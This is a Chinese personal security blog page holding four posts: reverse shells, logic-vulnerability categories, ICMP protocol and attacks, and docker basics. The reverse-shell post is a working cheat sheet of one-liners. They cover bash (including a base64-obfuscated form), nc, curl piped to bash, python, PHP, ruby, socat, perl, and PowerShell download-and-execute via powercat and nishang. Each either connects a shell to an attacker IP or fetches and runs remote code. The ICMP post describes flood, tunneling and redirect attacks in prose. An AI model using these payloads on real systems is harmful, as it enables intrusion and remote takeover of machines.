<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Mkey的博客</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="学习与记录">
<meta property="og:type" content="website">
<meta property="og:title" content="Mkey的博客">
<meta property="og:url" content="https://monkeyh0ck.github.io/index.html">
<meta property="og:site_name" content="Mkey的博客">
<meta property="og:description" content="学习与记录">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="HOU">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Mkey的博客" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Mkey的博客</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://monkeyh0ck.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-反弹shell" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/06/01/%E5%8F%8D%E5%BC%B9shell/" class="article-date">
  <time class="dt-published" datetime="2022-05-31T16:00:00.000Z" itemprop="datePublished">2022-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/06/01/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>控制端监听某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
<p>为什么需要反弹shell？</p>
<p>反弹shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。</p>
<h2 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h2><ol>
<li><p>bash反弹</p>
<p> <code>bash -i &gt;&amp; /dev/tcp/IP/prot 0&gt;&amp;1</code></p>
<p> 可以使用base64编码</p>
<p> <code>bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTAyLzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</code></p>
</li>
<li><p>nc反弹</p>
<p> <code>nc -e /bin/bash ip port</code><br> <code>-e</code>后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(&#x2F;bin&#x2F;bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。</p>
</li>
<li><p>curl反弹</p>
<p> <code>curl ip/bash.html|bash</code></p>
<p> 将bash命令写入html，将文件命令输入bash执行</p>
</li>
<li><p>whois反弹<br> <code>whois -h ip -p port shell</code></p>
<p> 只能执行shell命令</p>
</li>
<li><p>python反弹<br> <code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.102&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p>
</li>
<li><p>PHP反弹<br> <code>php -r &#39;$sock=fsockopen(&quot;192.168.2.102&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
</li>
<li><p>ruby反弹<br> <code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;192.168.2.102&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code></p>
</li>
</ol>
<p>8.socat反弹<br>    <code>socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:192.168.2.102:4444</code></p>
<ol start="9">
<li>perl反弹<br> <code>perl -e &#39;use Socket;$i=&quot;192.168.2.102&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></li>
</ol>
<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><ol>
<li><p>powercat反弹<br> <code>System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c 192.168.2.103 -p 4444 -e cmd</code></p>
</li>
<li><p>nc反弹<br> <code>nc 192.168.2.103 4444 -e c:\windows\system32\cmd.exe</code></p>
</li>
<li><p>nishang反弹<br> <code>IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.2.103 -port 4444</code></p>
</li>
<li><p>reverse UDP shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.2.103/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;);</span><br><span class="line"></span><br><span class="line">Invoke-PowerShellUdp -Reverse -IPAddress 192.168.2.103 -port 4444</span><br></pre></td></tr></table></figure>
</li>
<li><p>msf反弹</p>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://monkeyh0ck.github.io/2022/06/01/%E5%8F%8D%E5%BC%B9shell/" data-id="clfpez93u0004fcv5duyqaqa1" data-title="反弹shell" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-逻辑漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/06/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2022-05-31T16:00:00.000Z" itemprop="datePublished">2022-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/06/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><ul>
<li>身份验证漏洞<ul>
<li>暴力破解漏洞</li>
<li>session固定攻击</li>
<li>cookie欺骗漏洞</li>
</ul>
</li>
<li>权限类逻辑漏洞<ul>
<li>平行权限跨越</li>
<li>垂直权限跨越</li>
<li>未经授权访问</li>
</ul>
</li>
<li>图形验证码漏洞<ul>
<li>图形验证码突破</li>
</ul>
</li>
<li>找回密码逻辑漏洞<ul>
<li>密码找回漏洞</li>
</ul>
</li>
<li>业务数据篡改漏洞<ul>
<li>业务数据篡改</li>
</ul>
</li>
<li>执行军需逻辑漏洞<ul>
<li>执行顺序篡改</li>
</ul>
</li>
<li>其他类型逻辑漏洞<ul>
<li>条件竞争漏洞</li>
<li>数据包重放漏洞</li>
<li>参数绑定漏洞</li>
</ul>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://monkeyh0ck.github.io/2022/06/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" data-id="clfpez93z000cfcv59ri57hgf" data-title="逻辑漏洞" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ICMP" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/ICMP/" class="article-date">
  <time class="dt-published" datetime="2021-09-30T16:00:00.000Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/ICMP/">ICMP</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h1><p>ICMP 的全称是 <code>Internet Control Message Protocol(互联网控制协议)</code>，它是一种互联网套件，它用于<strong>IP 协议中发送控制消息</strong>。也就是说，ICMP 是依靠 IP 协议来完成信息发送的，它是 IP 的主要部分，但是从体系结构上来讲，它位于 IP 之上，因为 ICMP 报文是承载在 IP 分组中的，就和 TCP 与 UDP 报文段作为 IP 有效载荷被承载那样。</p>
<h3 id="ICMP的主要功能"><a href="#ICMP的主要功能" class="headerlink" title="ICMP的主要功能"></a>ICMP的主要功能</h3><ul>
<li>确认IP包是否能够成功到达目的地址</li>
<li>网络诊断：ping、reaceroute。</li>
</ul>
<p>例如：主机A访问主机B，主机B无响应，ICMP返回目标不可达</p>
<p><img src="/2021/10/01/ICMP/image-20211022160900430.png" alt="image-20211022160900430"></p>
<h3 id="ICMP数据包的具体通知类型"><a href="#ICMP数据包的具体通知类型" class="headerlink" title="ICMP数据包的具体通知类型"></a>ICMP数据包的具体通知类型</h3><p><img src="/2021/10/01/ICMP/image-20211022161132003.png" alt="image-20211022161132003"></p>
<p><strong>ICMP通知类型</strong></p>
<ul>
<li>差错报文：有关IP数据报传递的ICMP报文</li>
<li>信息类报文：信息采集和配置的ICMP报文</li>
</ul>
<h3 id="ICMP在IPv4和IPv6的封装"><a href="#ICMP在IPv4和IPv6的封装" class="headerlink" title="ICMP在IPv4和IPv6的封装"></a>ICMP在IPv4和IPv6的封装</h3><p><img src="/2021/10/01/ICMP/image-20211022161448054.png" alt="image-20211022161448054"></p>
<p><img src="/2021/10/01/ICMP/image-20211022161501371.png" alt="image-20211022161501371"></p>
<p>除ICMP头部4字节一样外，其余字节都不同，ICMP头部包含了整个ICMP数据段的校验和</p>
<p><img src="/2021/10/01/ICMP/image-20211022161645766.png" alt="image-20211022161645766"></p>
<p>所有的 ICMP 报文都以 8 位的类型(Type)和代码(Code) 字段开始，其后的 16 位校验和涵盖了整个报文，ICMPv4 和 ICMPv6 种的类型和代码字段是不同的。</p>
<h3 id="ICMP的主要消息"><a href="#ICMP的主要消息" class="headerlink" title="ICMP的主要消息"></a>ICMP的主要消息</h3><ul>
<li>目标不可达（类型3）<ul>
<li><img src="/2021/10/01/ICMP/image-20211022162021558.png" alt="image-20211022162021558"></li>
</ul>
</li>
<li>重定向消息（类型5）<ul>
<li>如果路由器发现发送端主机使用了次优的路径发送数据，那么它会返回一个 <strong>ICMP 重定向(ICMP Redirect Message)</strong> 的消息给这个主机。这个 ICMP 重定向消息包含了最合适的<strong>路由信息和源数据</strong>。这种情况会发生在路由器持有更好的路由信息的情况下。路由器会通过这样的 ICMP 消息给发送端主机一个更合适的发送路由。</li>
<li>优点<ul>
<li>优化数据在网络中的转发路径；流量更快到达目的地</li>
<li>降低网络资源利用率，例如带宽和路由器 CPU 负载</li>
</ul>
</li>
</ul>
</li>
<li>超时消息（类型11）<ul>
<li>在 IP 数据包中有一个叫做 <code>TTL(Time To Live, 生存周期)</code> ，它的值在每经过路由器一跳之后都会减 1，IP 数据包减为 0 时会被丢弃。此时，IP 路由器会发送一个 ICMP 超时消息(ICMP TIme Exceeded Message, 错误号 0)发送给主机，通知该包已经被丢弃。</li>
</ul>
</li>
<li>回送消息(类型0和类型8)<ul>
<li>ICMP 回送消息用于判断相互通信的主机之间是否连通，也就是判断所发送的数据包是否能够到达目标主机。可以向对端主机发送<code>回送请求的消息(ICMP Echo Request Message,类型 8)</code>，也可以接收对端主机发送来的回送消息(ICMP Echo Reply Message, 类型 0 )。网络上最常用的 ping 命令就是利用这个实现的。</li>
</ul>
</li>
<li>原点抑制消息（类型4）<ul>
<li>在使用低速率网络的情况下，网络通信可能会遇到网络拥堵的情况下，ICMP 的原点抑制就是为了应对这种情况的。当路由器向低速线路发送数据时，其发送队列的残存数据报变为 0 从而无法发送时，可以向 IP 数据报的源地址发送一个 <code>ICMP 原点抑制(ICMP Source Quench Message)</code> 消息，收到这个消息的主机了解到线路某处发生了拥堵，从而抑制 IP 数据报的发送。</li>
<li><img src="/2021/10/01/ICMP/image-20211022162705492.png" alt="image-20211022162705492"></li>
</ul>
</li>
<li>路由器探索消息（类型9和类型10）<ul>
<li>ICMP 路由器探索消息主要用于<code>路由器发现(Router Discovery, RD)</code>，它主要分为两种，<code>路由器请求(Router Solicitation, 类型 10)</code> 和<code>路由器响应(Router Advertisement, 类型 9)</code>。主机会在任意路由连接组播的网络上发送一个 RS 消息，想要选择一个路由器进行学习，以此来作为默认路由，而相对应的该路由会发送一个 RA 消息来作为默认路由的响应。</li>
</ul>
</li>
<li>地址掩码消息（类型17和类型18）<ul>
<li>主要用于主机或者路由器想要了解子网掩码的情况。可以向那些目标主机或路由器发送 <code>ICMP 地址掩码请求消息(ICMP Address Mask Request, 类型 17)</code> 和 <code>ICMP 地址掩码应答消息(ICMP Address Mask Reply, 类型 18)</code> 获取子网掩码信息。</li>
</ul>
</li>
</ul>
<h3 id="ICMPv6"><a href="#ICMPv6" class="headerlink" title="ICMPv6"></a>ICMPv6</h3><p>在IPv4时期，ICMP只是辅助，即使没有ICMP也能进行IP数据包的发送和接收，而在IPv6中，ICMP的作用被放大了，没有ICMP，则不能正常IP通信。</p>
<p>尤其在 IPv6 中，从 IP 定位 MAC 地址的协议从 ARP 转为 ICMP 的<code>邻居探索消息(Neighbor Discovery)</code> 。这种邻居探索消息融合了 IPv4 的 ARP、ICMP 重定向以及 ICMP 的路由选择等功能于一体。甚至还提供了自动设置 IP 的功能。</p>
<p>ICMP消息分为两类：</p>
<ul>
<li>错误消息（0-127）</li>
<li>信息消息（128-255）</li>
</ul>
<p><img src="/2021/10/01/ICMP/image-20211022163329802.png" alt="image-20211022163329802"></p>
<h3 id="ICMPv6的额外功能"><a href="#ICMPv6的额外功能" class="headerlink" title="ICMPv6的额外功能"></a>ICMPv6的额外功能</h3><ul>
<li>ICMPv6邻居探索</li>
<li>即插即用</li>
</ul>
<h4 id="ICMPv6邻居探索"><a href="#ICMPv6邻居探索" class="headerlink" title="ICMPv6邻居探索"></a>ICMPv6邻居探索</h4><p>邻居探索是 ICMPv6 非常重要的功能，主要表示的类型是 133 – 137 之间的消息叫做<code>邻居探索消息</code>。这种邻居探索消息对于 IPv6 通信起到举足轻重的作用。邻居请求消息用于查询 IPv6 地址于 MAC 地址的对应关系。邻居请求消息利用 IPv6 的多播地址实现传输。</p>
<p><img src="/2021/10/01/ICMP/image-20211022163624421.png" alt="image-20211022163624421"></p>
<h4 id="即插即用"><a href="#即插即用" class="headerlink" title="即插即用"></a>即插即用</h4><p>在没有 <code>DHCP</code> 服务器的环境下也能实现 IP 地址的自动获取。如果是一个没有路由器的网络，就使用 MAC 地址作为链路本地单播地址。如果在一个有路由器的网络环境中，可以从路由器获得 IPv6 地址的前面部分，后面部分使用 MAC 地址进行设置。此时可以利用路由器请求消息和路由器公告消息进行设置。</p>
<p><img src="/2021/10/01/ICMP/image-20211022163841222.png" alt="image-20211022163841222"></p>
<h3 id="ICMPv6-的组播收听发现协议"><a href="#ICMPv6-的组播收听发现协议" class="headerlink" title="ICMPv6 的组播收听发现协议"></a>ICMPv6 的组播收听发现协议</h3><p><code>组播收听发现协议（MLD，Multicast Listener Discovery）</code>由子网内的组播成员管理。MLD 协议定义了3条ICMPv6 消息：</p>
<ul>
<li>组播收听查询消息：组播路由器向子网内的组播收听者发送此消息，以获取组播收听者的状态。</li>
<li>组播收听者报告消息：组播收听者向组播路由器汇报当前状态，包括离开某个组播组。</li>
<li>组播收听者。</li>
</ul>
<h3 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h3><ul>
<li>原理<ul>
<li>由于ICMP报文自身可以携带数据，而且ICMP报文是由系统内核处理的，不占用任何端口，因此具有很高的隐蔽性</li>
<li>通常ICMP隧道技术采用ICMP的ICMP_ECHO和ICMP_ECHOREPLY两种报文，把数据隐藏在ICMP数据包包头的选项域中，利用ping命令建立隐蔽通道。简单说就是，改变操作系统默认填充的Data，替换成我们自己的数据。</li>
<li>所以现在的<strong>ICMP隧道技术</strong>，基本采用修改ICMPECHO和ICMPECHOREPLY两种报文，把消息隐藏在数据中，利用ping或 tracert 命令建立隐蔽通道。</li>
</ul>
</li>
<li>优点<ul>
<li>防火墙对ICMP_ECHO数据包是放行的，并且内部主机不会检查ICMP数据包所携带的数据内容，隐蔽性高</li>
</ul>
</li>
<li>缺点<ul>
<li>ICMP隐蔽传输是无连接的，传输不是很稳定，而且隐蔽通道的带宽很低。</li>
<li>利用隧道传输时，需要接触更低层次的协议 ，这就需要高级用户权限。</li>
</ul>
</li>
</ul>
<h3 id="ICMP相关攻击"><a href="#ICMP相关攻击" class="headerlink" title="ICMP相关攻击"></a>ICMP相关攻击</h3><ul>
<li>泛洪：将会产生大量流量，导致针对一台或者多台计算机的有效 Dos 攻击。<ul>
<li>直接Flood：不过会暴露自己IP</li>
<li>伪造IP的Flood</li>
<li>反射：使用受害者IP对其他服务器发出请求</li>
<li>SMURF攻击<ul>
<li>发送伪装的ICMP数据包，目的地址设为某个网络的广播地址，源地址设为要攻击的目的主机，使所有收到此ICMP数据包的主机都将对目的主机发出一个回应，使被攻击主机在某一段时间内收到 成千上万的数据包</li>
</ul>
</li>
</ul>
</li>
<li>炸弹：指的是发送经过特殊构造的报文，这类报文能够导致 IP 或者 ICMP 的处理失效或者崩溃。<ul>
<li>Ping of Death<ul>
<li>这种攻击通过发送大于65536字节的ICMP包使操作系统崩溃；通常不可能发送大于65536个字节的ICMP包，但可以把报文分割成片段，然后在目标主机上重组；最终会导致被攻击目标缓冲区溢出，引起拒绝服务攻击。</li>
</ul>
</li>
<li>泪滴<ul>
<li>对于一些大的IP数据包，往往需要对其进行拆分传送，这是为了迎合链路层的MTU（最大传输单元）的要求。在IP报头中有一个偏移字段和一个拆分标志（MF）。如果MF标志设置为1，则表示这个IP包是一个大IP包的片段，其中偏移字段指出了这个片段在整个IP包中的位置。把偏移字段设置成不正确的值，这样接收端在收到这些分拆的数据包后，就不能按数据包中的偏移字段值正确组合这些拆分的数据包，但接收端会不断尝试，这样就可能致使目标计算机操作系统因资源耗尽而崩溃。</li>
</ul>
</li>
<li>Land<ul>
<li>在Land攻击中，黑客利用一个特别打造的SYN包–它的原地址和目标地址都被设置成某一个服务器地址进行攻击。此举将导致接受服务器向它自己的地址发送SYN-ACK消息，结果这个地址又发回ACK消息并创建一个空连接，每一个这样的连接都将保留直到超时，在Land攻击下，许多UNIX将崩溃，NT变得极其缓慢（大约持续五分钟）。</li>
</ul>
</li>
<li>重定向导致的攻击<ul>
<li>ICMP重定向信息是路由器向主机提供实时的路由信息，当一个主机收到ICMP重定向信息(上面提到，type&#x3D;5)时，它就会根据这个信息来更新自己的路由表。由于缺乏必要的合法性检查，如果一个黑客想要被攻击的主机修改它的路由表，黑客就会发送ICMP重定向信息给被攻击的主机，让<strong>该主机按照黑客的要求来修改路由表</strong>。</li>
</ul>
</li>
<li>流氓RA<ul>
<li>ICMP路由器通告和路由器请求报文<strong>能被用于创建一个类似于重定向攻击的攻击。</strong>特别是，这些报文可导致受害者系统修改它们的默认路由，指向被人侵的机器。此外，被动地接 收这些报文可以使攻击者了解本地网络环境的拓扑结构。</li>
</ul>
</li>
<li>修改PTB报文<ul>
<li>这个报文包含一个表示推荐MTU值 的字段。这将被传输协议(如TCP)用来选择它们数据包的大小。如果攻击者修改这个值，它将强制终端TCP运行时使用非常小的数据包(从而导致性能低下)</li>
</ul>
</li>
<li>伪随机<ul>
<li>ICMP时间戳请求&#x2F;应答报文(在正常操作中已不再使用)能根据一些主机学习到当前时间(如果启用的话)。由于许多关于安全的方法是基于使用随机密钥加密的，如果源和状态的随机性是可知的，一个外部参与者就可以预测用来创建加密密钥的伪随机数序列(这就是为 什么它们是伪随机(pseudo-random)的原因)，可能会允许第三方猜测秘密值并劫持连接(见后面文章的TCP和随机数讨论)。因为许多随机数是基于一天中的当前时间，暴露一个主机的精确时间是一个问题。</li>
</ul>
</li>
<li>smack攻击<ul>
<li>ICMP目的不可达报文可造成现有连接(例如, TCP连接)的<strong>拒绝服务</strong>。在一些实现中，接收来自于一个IP地址的主机不可达、端口不可达或协议不可达报文将导致关闭和这个地址关联的传输层连接：这些攻击有时也被称为Smack或BIoop攻击</li>
</ul>
</li>
</ul>
</li>
<li>信息泄露：本身不会造成危害，但是能够帮助辅助其他攻击。</li>
</ul>
<blockquote>
<p>参考资料：</p>
<p><a target="_blank" rel="noopener" href="https://www.cxyxiaowu.com/17474.html">ICMP协议_吴师兄学编程 (cxyxiaowu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/291179.html">浅析Icmp原理及隐蔽攻击的方式 - FreeBuf网络安全行业门户</a></p>
<p><a target="_blank" rel="noopener" href="https://www.daimajiaoliu.com/daima/4ed3e66d61003fc">ip icmp flood 等 常见的攻击 (daimajiaoliu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15346415/3689999">TCP&#x2F;IP卷一:49—ICMP之（与ICMP相关的攻击）_董哥的黑板报_51CTO博客</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://monkeyh0ck.github.io/2021/10/01/ICMP/" data-id="clfpez93m0000fcv56ywb5vt2" data-title="ICMP" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-docker" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/docker/" class="article-date">
  <time class="dt-published" datetime="2021-09-30T16:00:00.000Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/docker/">docker</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><h2 id="docker-概念"><a href="#docker-概念" class="headerlink" title="docker 概念"></a>docker 概念</h2><p>解决环境配置的问题，将运行环境打包发布。</p>
<p>虚拟化、容器化！</p>
<p><strong>隔离</strong>：核心思想</p>
<p>开发语言：Go</p>
<p>官网：<a target="_blank" rel="noopener" href="https://www.docker.com/">Empowering App Development for Developers | Docker</a></p>
<p>dockerhub：<a target="_blank" rel="noopener" href="https://registry.hub.docker.com/">Docker Hub</a></p>
<p>虚拟机技术缺点：</p>
<ol>
<li>资源占用多</li>
<li>步骤多</li>
<li>启动慢</li>
</ol>
<p>容器化技术：不是完整的操作系统</p>
<p>容器没有内核，直接运行在宿主机内核中。每个容器相互隔离，互不影响。</p>
<h4 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h4><p><strong>应用快速部署！</strong>使用docker一键运行。</p>
<p><strong>更便捷的升级和扩容</strong></p>
<p><strong>更高效的计算资源利用</strong></p>
<p><strong>更简单的系统运维</strong></p>
<h2 id="docker-安装"><a href="#docker-安装" class="headerlink" title="docker 安装"></a>docker 安装</h2><h4 id="docker-基本组成"><a href="#docker-基本组成" class="headerlink" title="docker 基本组成"></a>docker 基本组成</h4><ol>
<li>镜像（image）：docker镜像就是一个模板，通过镜像可以创建多个容器。</li>
<li>容器（container）：docker利用容器技术，独立运行应用，通过镜像创建，相当于一个简易linux系统</li>
<li>仓库（repository）：存放镜像的地方</li>
</ol>
<h4 id="安装-docker"><a href="#安装-docker" class="headerlink" title="安装 docker"></a>安装 docker</h4><p>安装步骤：</p>
<pre><code>1.	卸载旧版本
2.	需要的安装包
3.	设置镜像仓库
4.	跟新软件包索引
5.	安装docker
6.	启动docker：systemctl start docker
</code></pre>
<p>卸载步骤：</p>
<pre><code>1. 卸载软件
2. 删除资源：rm -rf /var/lib/docker
</code></pre>
<h2 id="docker原理"><a href="#docker原理" class="headerlink" title="docker原理"></a>docker原理</h2><h4 id="docker比VM快的原因"><a href="#docker比VM快的原因" class="headerlink" title="docker比VM快的原因"></a>docker比VM快的原因</h4><ol>
<li>docker比虚拟机又更少的抽象层</li>
<li>docker利用的是宿主机的内核，vm需要是guest os，省略了复杂过程</li>
</ol>
<h2 id="docker-常用命令"><a href="#docker-常用命令" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h2><h4 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h4><blockquote>
<p>docker version 		显示版本</p>
<p>docker 命令 –help	帮助命令</p>
<p>docker info				显示系统信息，包括镜像和容器的数量</p>
</blockquote>
<h4 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h4><blockquote>
<p>docker images 	查看镜像地址</p>
<p>docker search 	  搜索镜像</p>
<p>docker pull 			下载镜像</p>
<p>docker rmi -f 容器id			删除镜像</p>
</blockquote>
<h4 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h4><blockquote>
<p>docker run image	运行</p>
<p>-d 					后台方式运行</p>
<p>-it					使用交互模式</p>
<p>-p 宿主机端口：容器端口					指定容器端口</p>
<p>–name			命名</p>
<p>exit					停止并退出容器</p>
<p>ctrl+P+Q  		退出容器、容器不停止</p>
<p>docker ps 		列出正在运行的容器</p>
<p>-a 					正在运行的同期+带出历史运行过的容器</p>
<p>-n&#x3D;？				最近创建的容器</p>
<p>docker rm 容器id		删除容器，不能删除正在运行的</p>
<p>docker rm -f 容器id 	强制删除容器</p>
<p>docker start 容器id	开启</p>
<p>docker restart 容器id	重启</p>
<p>docker stop 容器id	停止正在运行的容器</p>
<p>docker kill 容器id		强制停止正在运行的容器</p>
</blockquote>
<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h4><blockquote>
<p>docker run -d 容器id 		后台运行</p>
<p>当没有前台的程序时，后台程序没有提供服务，则立即结束</p>
<p>docker logs -f -t 容器id	查看容器日志</p>
<p>docker top 容器id 	查看容器运行id</p>
<p>docker inspect 容器id	查看容器源数据</p>
</blockquote>
<h4 id="进入当前正在运行的容器"><a href="#进入当前正在运行的容器" class="headerlink" title="进入当前正在运行的容器"></a>进入当前正在运行的容器</h4><blockquote>
<p>#方式一</p>
<p>docker exec -it  容器id  bashShell(&#x2F;bin&#x2F;bash)	新命令行</p>
<p>#方式二</p>
<p>docker attach 容器id				进入正在运行的命令行</p>
</blockquote>
<h4 id="从容器内拷贝文件"><a href="#从容器内拷贝文件" class="headerlink" title="从容器内拷贝文件"></a>从容器内拷贝文件</h4><blockquote>
<p>docker cp 容器id：容器内路径   目的的主机路径</p>
</blockquote>
<p><em>阿里云镜像都是最小可运行环境</em></p>
<blockquote>
<p>docker status 		查看cpu状态</p>
</blockquote>
<h2 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h2><ul>
<li>portainer</li>
<li>rancher</li>
</ul>
<h4 id="commit镜像"><a href="#commit镜像" class="headerlink" title="commit镜像"></a>commit镜像</h4><blockquote>
<p>docker commit 提交容器成为一个新副本</p>
<p>docker commit -m&#x3D;”提交的描述信息” -a&#x3D;”作者” 容器id 目标镜像名</p>
</blockquote>
<h2 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h2><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>数据存储在容器中，一旦容器删除，数据也随之丢失</p>
<p><strong>需求：数据持久化，存储在容器外。</strong></p>
